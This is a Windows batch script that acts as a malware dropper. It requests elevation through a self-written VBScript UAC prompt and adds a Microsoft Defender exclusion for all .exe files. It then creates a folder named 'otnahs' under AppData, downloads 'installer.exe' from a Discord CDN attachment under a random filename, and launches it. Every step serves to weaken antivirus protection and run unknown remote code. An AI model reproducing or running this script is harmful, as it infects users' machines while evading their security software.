@echo off

setlocal enabledelayedexpansion

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

Powershell -Command "Set-MpPreference -ExclusionExtension exe"

set "tempFolder=%APPDATA%\Roaming\otnahs"
md "%tempFolder%" 2>nul

cd /D "%tempFolder%"

set "extension=.exe"
set "counter=1"

:generateFilename
set "filename=%random%%random%%random%%extension%"
if exist "%filename%" goto generateFilename

Powershell -Command "Invoke-Webrequest 'https://cdn.discordapp.com/attachments/1116778631419674695/1116837118459781130/installer.exe' -OutFile !filename!"

start "" "!filename!"
